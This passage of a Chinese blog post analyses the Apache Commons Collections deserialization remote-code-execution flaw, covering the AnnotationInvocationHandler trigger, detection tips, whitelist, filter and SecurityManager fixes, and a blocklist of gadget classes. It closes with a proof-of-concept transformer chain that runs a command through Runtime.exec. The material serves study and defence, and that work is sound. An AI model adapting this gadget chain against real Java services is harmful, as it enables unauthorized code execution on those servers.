= AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>成员变量memberValues是Map类型，readObject()函数中对memberValues的每一项都调用了setValue函数，（setVaule会调用checkSetValue，checkSetValue会调用transform()）。所以我们就可以使用前面构造的Map来构造AnnotationInvocationHandler，在进行序列化时 执行AnnotationInvocationHandler中重写的readObject方法，对value值进行修改，触发对应的transform链(执行命令)。</p>
+</blockquote>
+<h3 id="TransformedMap与AnnotationInvocationHandler"><a href="#TransformedMap与AnnotationInvocationHandler" class="headerlink" title="TransformedMap与AnnotationInvocationHandler"></a>TransformedMap与AnnotationInvocationHandler</h3><p>想要调用未包含的package中的构造函数，只能通过反射的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></pre></td></tr></table></figure></p>
+<p>且根据AnnotationInvocationHandler中readObject():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String var6 = (String)var5.getKey();</span><br><span class="line">Class var7 = (Class)var3.get(var6);</span><br><span class="line">if (var7 != null) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可知道条件是var5与var7不能为null，var3是Retention，查看下Retention的成员，发现只有一个value，那么var5只需要put一个键为字符串”value”，Value不为annotation的实例化对象即可(可以为任意String字符串与Integer对象))<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.16.42.14-image.png" alt="2019-03-27.16.42.14-image.png"></p>
+<p>使用TransformedMap与AnnotationInvocationHandler类触发反序列化漏洞时的大致步骤:</p>
+<blockquote>
+<ul>
+<li>使用ConstantTransformer与InvokerTransformer构造一个Transformer数组（指定需要执行的代码）</li>
+<li>将第一步得到的数组转化为ChainedTransformer调用链</li>
+<li>使用decorate方法创建数组outmap，参数为非空Map对象(map)与上一步得到的ChainedTransformer对象</li>
+<li>使用Java反射机制创建AnnotationInvocationHandler对象，构造函数指定数组(outmap)</li>
+<li>对AnnotationInvocationHandler进行序列化，发送给Java中间件</li>
+<li>Java中间件在对AnnotationInvocationHandler进行反序列化时，调用其中重写的readObject方法，对传入的参数Map进行setValue操作，触发漏洞，调用ConstantTransformer与InvokerTransformer指定的任意代码</li>
+</ul>
+</blockquote>
+<p>总结:            </p>
+<blockquote>
+<p>攻击者将构造好的包含攻击代码的序列化数据发送给使用了Apache Commons Collections等危险组件的Java中间件时，Java中间件在对其进行反序列化操作时，触发反序列化漏洞，执行攻击者构造的任意代码</p>
+</blockquote>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><h4 id="搜索危险库"><a href="#搜索危险库" class="headerlink" title="搜索危险库"></a>搜索危险库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">common-logging 1.2</span><br><span class="line">common-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure>
+<h4 id="搜索危险函数"><a href="#搜索危险函数" class="headerlink" title="搜索危险函数"></a>搜索危险函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject		</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject	</span><br><span class="line">Yaml.load</span><br><span class="line">Json.parseObject</span><br><span class="line">XStream.fromXML</span><br></pre></td></tr></table></figure>
+<h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><p><a href="https://xz.aliyun.com/t/2041#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/2041#toc-6</a><br>黑盒测试中，可通过抓包检测请求中可能存在的序列化数据(通常以AC ED开头 之后为两个字节的版本号0005 或者是base64编码后的rO0AB)<br>将序列化数据用<a href="https://github.com/NickstaDB/SerialBrute/" target="_blank" rel="noopener">SerialBrute.py脚本</a>处理后插入我们的payload</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h4 id="重写resolveClass来检验反序列化的类"><a href="#重写resolveClass来检验反序列化的类" class="headerlink" title="重写resolveClass来检验反序列化的类"></a>重写resolveClass来检验反序列化的类</h4><p>在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以我们可以通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化的校验。可以白名单检验:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class AntObjectInputStream extends ObjectInputStream&#123;</span><br><span class="line">    public AntObjectInputStream(InputStream inputStream) throws IOException&#123;</span><br><span class="line">        super(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    只允许反序列化User class</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">        if(!desc.getName().equals(User.class))&#123;</span><br><span class="line">            throw new InvalidClassException(&quot;Unauthorized&quot;,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="使用ObjectInputFilter来校验反序列化的类"><a href="#使用ObjectInputFilter来校验反序列化的类" class="headerlink" title="使用ObjectInputFilter来校验反序列化的类"></a>使用ObjectInputFilter来校验反序列化的类</h4><p>Java9支持序列化数据过滤的新特性，开发人员继承java.io.ObjectInputFilter类重写checkInput()实现自定义的过滤器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.util.List;</span><br><span class="line">import java.util.Optional;</span><br><span class="line">import java.util.function.Function;</span><br><span class="line">import java.io.ObjectInputFilter;</span><br><span class="line">class BikeFilter implements ObjectInputFilter &#123;</span><br><span class="line">	private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.</span><br><span class="line">	private long maxDepth = 1; // Maximum depth of the graph allowed.</span><br><span class="line">	private long maxReferences = 1; // Maximum number of references in a graph.</span><br><span class="line">	@Override</span><br><span class="line">	public Status checkInput(FilterInfo filterInfo) &#123;</span><br><span class="line">		if (filterInfo.references() &lt; 0 || filterInfo.depth() &lt; 0 || filterInfo.streamBytes() &lt; 0 || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) &#123;</span><br><span class="line">			return Status.REJECTED;</span><br><span class="line">		&#125;</span><br><span class="line">		Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">		if (clazz != null) &#123;</span><br><span class="line">			if (SerialObject.class == filterInfo.serialClass()) &#123;</span><br><span class="line">				return Status.ALLOWED;</span><br><span class="line">			&#125;</span><br><span class="line">			else &#123;</span><br><span class="line">				return Status.REJECTED;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return Status.UNDECIDED;</span><br><span class="line">	&#125; // end checkInput</span><br><span class="line">&#125; // end class BikeFilter</span><br></pre></td></tr></table></figure></p>
+<p>只允许反序列化SerialObject类对象。</p>
+<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h4 id="禁止JVM执行外部命令"><a href="#禁止JVM执行外部命令" class="headerlink" title="禁止JVM执行外部命令"></a>禁止JVM执行外部命令</h4><p>通过扩展SecurityManager来禁止执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager originalSecurityManager = System.getSecurityManager();</span><br><span class="line">        if (originalSecurityManager == null) &#123;</span><br><span class="line">            // 创建自己的SecurityManager</span><br><span class="line">            SecurityManager sm = new SecurityManager() &#123;</span><br><span class="line">                private void check(Permission perm) &#123;</span><br><span class="line">                    // 禁止exec</span><br><span class="line">                    if (perm instanceof java.io.FilePermission) &#123;</span><br><span class="line">                        String actions = perm.getActions();</span><br><span class="line">                        if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) &#123;</span><br><span class="line">                            throw new SecurityException(&quot;execute denied!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // 禁止设置新的SecurityManager，保护自己</span><br><span class="line">                    if (perm instanceof java.lang.RuntimePermission) &#123;</span><br><span class="line">                        String name = perm.getName();</span><br><span class="line">                        if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) &#123;</span><br><span class="line">                            throw new SecurityException(&quot;System.setSecurityManager denied!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                @Override</span><br><span class="line">                public void checkPermission(Permission perm) &#123;</span><br><span class="line">                    check(perm);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                @Override</span><br><span class="line">                public void checkPermission(Permission perm, Object context) &#123;</span><br><span class="line">                    check(perm);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            System.setSecurityManager(sm);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="禁止一些危险类"><a href="#禁止一些危险类" class="headerlink" title="禁止一些危险类"></a>禁止一些危险类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections.functors.InstantiateTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InstantiateTransformer</span><br><span class="line">org.codehaus.groovy.runtime.ConvertedClosure</span><br><span class="line">org.codehaus.groovy.runtime.MethodClosure</span><br><span class="line">org.springframework.beans.factory.ObjectFactory</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.commons.beanutils</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/xiohao/p/4234184.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiohao/p/4234184.html</a><br><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">https://paper.seebug.org/312/</a><br><a href="http://www.vuln.cn/6296" target="_blank" rel="noopener">http://www.vuln.cn/6296</a><br><a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">https://xz.aliyun.com/t/3847</a><br><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //transformers数组 ChainedTransformer按顺序调用一系列的变换</span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        //TransformedMap(map, keyTransformer, valueTransformer)</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);</span><br><span class="line">        Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;1111&quot;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Java安全/" rel="tag"># Java安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/27/xxe/" rel="next" title="XXE漏洞总结">
+                <i class="fa fa-chevron-left"></i> XXE漏洞总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/01/Struts2-001漏洞分析/" rel="prev" title="Struts2_RCE漏洞分析1(s2-001)">
+                Struts2_RCE漏洞分析1(s2-001) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">P0rZ9</p>
+              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-CommonsCollections-序列化RCE漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">Apache-CommonsCollections 序列化RCE漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TransformedMap与AnnotationInvocationHandler"><span class="nav-number">2.1.</span> <span class="nav-text">TransformedMap与AnnotationInvocationHandler</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞检测"><span class="nav-number">3.</span> <span class="nav-text">漏洞检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#白盒"><span class="nav-number">3.1.</span> <span class="nav-text">白盒</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#搜索危险库"><span class="nav-number">3.1.1.</span> <span class="nav-text">搜索危险库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#搜索危险函数"><span class="nav-number">3.1.2.</span> <span class="nav-text">搜索危险函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑盒"><span class="nav-number">3.2.</span> <span class="nav-text">黑盒</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复方案"><span class="nav-number">4.</span> <span class="nav-text">修复方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#白名单"><span class="nav-number">4.1.</span> <span class="nav-text">白名单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#重写resolveClass来检验反序列化的类"><span class="nav-number">4.1.1.</span> <span class="nav-text">重写resolveClass来检验反序列化的类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用ObjectInputFilter来校验反序列化的类"><span class="nav-number">4.1.2.</span> <span class="nav-text">使用ObjectInputFilter来校验反序列化的类</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单"><span class="nav-number">4.2.</span> <span class="nav-text">黑名单</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#禁止JVM执行外部命令"><span class="nav-number">4.2.1.</span> <span class="nav-text">禁止JVM执行外部命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#禁止一些危险类"><span class="nav-number">4.2.2.</span> <span class="nav-text">禁止一些危险类</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P0rZ9</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
